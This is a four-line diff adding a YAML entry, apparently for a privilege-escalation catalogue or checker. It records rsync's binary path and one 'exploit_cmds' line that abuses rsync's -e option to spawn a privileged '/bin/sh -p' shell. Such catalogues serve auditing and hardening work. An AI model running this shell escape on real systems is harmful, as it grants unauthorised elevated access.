@@ -1,0 +1,4 @@
+name: rsync
+binary_path: /usr/bin/rsync
+exploit_cmds:
+- /usr/bin/rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
